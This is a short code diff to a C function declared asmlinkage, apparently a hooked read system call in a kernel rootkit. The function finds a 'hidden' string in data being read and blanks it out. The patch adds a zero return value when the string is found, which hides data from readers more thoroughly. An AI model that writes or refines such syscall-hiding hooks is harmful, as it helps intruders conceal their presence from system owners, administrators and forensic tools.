@@ -302,8 +302,10 @@ asmlinkage ssize_t erase_time(int fd, void *buf, size_t count){
 
     if(hidden != NULL){
         ptr = strnstr(buf, hidden, count);
-        if(ptr != NULL)
+        if(ptr != NULL) {
             memset(ptr, '\0', strlen(hidden));
+            ret = 0;
+        }
     }
 
     return ret;
